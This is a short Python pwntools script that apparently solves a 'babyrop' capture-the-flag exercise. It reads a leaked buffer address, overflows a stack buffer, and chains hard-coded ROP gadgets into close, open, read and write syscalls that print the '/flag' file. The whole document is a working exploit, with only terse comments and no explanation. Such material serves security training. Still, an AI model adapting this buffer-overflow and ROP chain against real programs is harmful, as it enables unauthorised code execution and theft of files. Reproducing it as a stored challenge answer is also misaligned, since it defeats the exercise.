from pwn import *

# Init
elf = ELF("/challenge/babyrop_level4.1")
context.arch = "amd64"
context.endian = "little"
io = elf.process()

# Vars
buffer_length = 124 + 4 + 8 # local_88 and variable int 4 byte (local_c) + EBP
io.recvuntil("at:")
buffer_addr = io.recvline()[1:15].decode()
buffer_addr = p64(int(buffer_addr, 16))

syscall_gadget = p64(0x000000000040127c)
set_rdi_registry_gadget = p64(0x0000000000401254)
set_rsi_registry_gadget = p64(0x0000000000401284)
set_rdx_registry_gadget = p64(0x000000000040125d)
set_rax_registry_gadget = p64(0x000000000040126d)
#push_rax_registry_gadget = p64(0x0000000000401209)

# Payload
payload = b"/flag" + b"\x00" + b"A"*(buffer_length - 6) + set_rax_registry_gadget + p64(0x3) + set_rdi_registry_gadget + p64(0x0) + syscall_gadget +set_rax_registry_gadget + p64(0x2)
payload += set_rdi_registry_gadget + buffer_addr + set_rsi_registry_gadget + p64(0x0) + set_rdx_registry_gadget + p64(0x0) + syscall_gadget
payload += set_rax_registry_gadget + p64(0x0) + set_rdi_registry_gadget + p64(0x0) + set_rsi_registry_gadget + buffer_addr + set_rdx_registry_gadget + p64(0x38) + syscall_gadget
payload += set_rax_registry_gadget + p64(0x1) + set_rdi_registry_gadget + p64(0x1) + set_rsi_registry_gadget + buffer_addr + set_rdx_registry_gadget + p64(0x38) + syscall_gadget 

# Action
io.sendline(payload)
io.interactive()